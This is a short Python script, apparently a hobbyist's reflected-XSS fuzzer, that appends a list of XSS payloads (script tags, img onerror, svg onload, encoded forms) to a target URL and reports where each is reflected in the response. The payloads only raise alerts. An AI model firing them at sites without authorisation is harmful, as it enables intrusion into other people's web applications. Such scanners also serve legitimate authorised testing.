#!/usr/bin/env python3
# reflectexss_fuzzer.py
# Author: John Jeffrey Mahiban
# website: rootkitdiaries.com
# Reflected XSS scanner to test input reflection and filtering

import requests              
import sys                     
import urllib.parse            
from bs4 import BeautifulSoup  

WEBSITE = "ROOTKITS.COM"

#  XSS test payloads 
payloads = [
    f"<script>alert('{WEBSITE} XSS')</script>",
    f"'><script>alert('BUY {WEBSITE}')</script>",
    f'"><img src=x onerror=alert("OWNED BY {WEBSITE}")>',
    f"<svg/onload=alert('XSS {WEBSITE}')>",
    f"<script>console.log('PWNED: {WEBSITE}')</script>",
    f"%3Cscript%3Ealert('{WEBSITE}')%3C%2Fscript%3E",  
    f"\\x3cscript\\x3ealert('{WEBSITE}')\\x3c/script\\x3e",  
    f"<body onload=alert('{WEBSITE} LOADED')>",
    f"';alert('{WEBSITE} VULNERABLE');//",
]

# Function to extract where the payload  reflected 
def extract_reflections(html, payload):
    soup = BeautifulSoup(html, 'html.parser')
    reflections = []

    if payload in soup.get_text():
        reflections.append("Page text / visible content")

    #  HTML tags & their attri
    for tag in soup.find_all(True):  # True = all tags
        for attr, val in tag.attrs.items():
            if isinstance(val, list):
                val = ' '.join(val)
            if payload in str(val):
                reflections.append(f"Tag <{tag.name}>, Attribute '{attr}'")

    return reflections

# Fun to test each payload against url
def test_xss(url):
    print(f"\n[+] Scanning URL: {url}\n")

    for payload in payloads:
        test_url = url + urllib.parse.quote(payload)
        try:
            response = requests.get(test_url, timeout=5)

            if payload in response.text:
                reflections = extract_reflections(response.text, payload)
                print(f"[!] Possible XSS Found!")
                print(f"    Payload: {payload}")
                print(f"    Full URL: {test_url}")
                for r in reflections:
                    print(f"    Reflected in: {r}")
                print("")
            else:
                print(f"[-] Not reflected: {payload}")

        except Exception as e:
            print(f"[!] Error testing payload: {payload} --> {e}")

# Main script
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python xss_fuzzer.py 'https://example.com/page?param='")
        sys.exit(1)

    target = sys.argv[1]
    test_xss(target)


